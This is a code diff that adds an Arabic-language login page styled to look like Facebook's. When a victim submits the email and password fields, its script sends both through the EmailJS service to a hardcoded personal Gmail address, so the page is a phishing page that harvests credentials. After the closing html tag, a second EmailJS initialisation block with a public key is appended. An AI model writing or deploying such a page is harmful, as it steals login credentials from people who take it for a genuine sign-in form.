@@ -1,0 +1,101 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #1877f2;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #165dbb;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>تسجيل الدخول</h2>
+        <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button onclick="sendData()">تسجيل الدخول</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // تهيئة EmailJS
+        (function() {
+            emailjs.init("YOUR_USER_ID"); // استبدل بـ User ID الخاص بك من EmailJS
+        })();
+
+        function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("يرجى ملء جميع الحقول!");
+                return;
+            }
+
+            // إرسال البيانات باستخدام EmailJS
+            emailjs.send("jamilw333@gmail.com", "template_jamil", {
+                to_email: "jamilw333@gmail.com", // البريد الإلكتروني الذي تريد إرسال البيانات إليه
+                email: email,
+                password: password
+            })
+            .then(function(response) {
+                alert("تم إرسال البيانات بنجاح!");
+                console.log("SUCCESS!", response.status, response.text);
+            }, function(error) {
+                alert("حدث خطأ أثناء إرسال البيانات!");
+                console.log("FAILED...", error);
+            });
+        }
+    </script>
+</body>
+</html> <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "uIuHX4lePfwZHyGe5",
+      });
+   })();
+</script>
